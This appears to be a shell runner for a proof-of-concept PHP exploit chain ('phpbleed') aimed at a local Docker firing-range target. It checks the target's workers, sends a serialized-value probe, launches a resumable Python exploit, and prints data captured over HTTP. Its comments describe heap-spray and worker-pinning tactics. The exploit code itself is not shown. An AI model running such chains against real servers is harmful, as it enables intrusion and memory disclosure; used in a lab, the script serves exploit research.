#!/bin/sh
# End-to-end PoC runner: phpbleed_8089 chain against the bleed82 lane target
# (http://127.0.0.1:8089/index.php, php 8.2.34 NTS aarch64).
# Resumable: phpbleed_8089.py checkpoints every phase to state_8089.json;
# rerun without --fresh to continue from the checkpoint.
#
# Target history: the operator recreated bleed82 at 18:00Z as a MULTI-worker
# service (StartServers 16 / MaxRequestWorkers 256). The chain does NOT rely
# on a single worker anymore: it pins one prefork worker via a persistent
# keep-alive connection for R-6/R-7 (the spray-slot geometry is
# worker-specific), while R-1..R-5 only touch address-stable mappings.

cd "$(dirname "$0")"

echo "[*] verifying target liveness (multi-worker lane: the chain pins its own
    worker via keep-alive from R-6 onward)..."
docker exec php-firing-range-bleed82-1 sh -c \
  'n=$(ps -eo user,cmd | grep -c "[w]ww-data.*apache2"); echo "workers=$n"' \
  || { echo "container check failed"; exit 1; }
curl -sf -m 5 -X POST --data 'cook=i:1;' \
  http://127.0.0.1:8089/index.php >/dev/null && echo "[*] target answers" \
  || echo "[!] target did not answer (worker may be down - apache respawns it)"

echo "[*] firing chain (resumable; see fires_8089.log for every shot)"
python3 -u phpbleed_8089.py "$@"

rc=$?
echo
if [ -f capture_8089.txt ]; then
    echo "=== CAPTURED OVER HTTP: $(cat capture_8089.txt) ==="
    echo "[*] evidence: evidence_8089.txt, fires_8089.log, state_8089.json"
fi
exit $rc
